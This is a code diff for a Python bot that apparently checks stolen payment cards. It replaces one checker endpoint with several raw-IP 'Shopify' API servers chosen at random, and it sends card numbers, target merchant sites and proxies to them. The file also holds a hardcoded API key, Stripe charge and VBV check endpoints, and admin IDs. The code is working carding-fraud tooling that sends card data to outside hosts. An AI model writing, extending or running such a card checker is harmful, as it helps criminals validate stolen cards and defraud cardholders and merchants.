@@ -54,7 +54,14 @@ def save_user_proxies(user_id, proxies):
         f.write('\n'.join(proxies))
 
 ADMIN_ID = [8987165792,7671957436]
-CHECKER_API_URL = 'https://shimmering-celebration-production-7dd0.up.railway.app/shopify'
+
+# Shopify APIs - load balanced
+SHOPIFY_APIS = [
+    'http://187.124.38.173:8002/3ltz-xK9qPm2r',   # Best
+    'http://72.61.178.178:8001/3ltz-xK9qPm2r',     # Top2
+    'http://72.61.178.178:8002/3ltz-xK9qPm2r',     # Top3
+]
+CHECKER_API_URL = SHOPIFY_APIS[0]
 CHECKER_API_KEY = 'AnonShopii2026!'
 STRIPE_CHARGE_API_URL = 'https://www.tekside.com.tn/bot/'
 VBV_API_URL = 'https://www.tekside.com.tn/api/check'
@@ -737,7 +744,9 @@ async def check_card(card, site, proxy):
                 proxy_str = f"{ip}:{port}"
             else:
                 proxy_str = proxy
-        url = f'{CHECKER_API_URL}?site={site}&cc={card}&key={CHECKER_API_KEY}'
+        # Random API selection for load balancing
+        api_base = random.choice(SHOPIFY_APIS)
+        url = f'{api_base}?cc={card}&site={site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         session = await get_http_session()
@@ -907,7 +916,8 @@ async def test_site_with_price(site, proxy):
             elif len(proxy_parts) == 2:
                 ip, port = proxy_parts
                 proxy_str = f"{ip}:{port}"
-        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}&key={CHECKER_API_KEY}'
+        api_base = random.choice(SHOPIFY_APIS)
+        url = f'{api_base}?cc={test_card}&site={site}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
         session = await get_http_session()
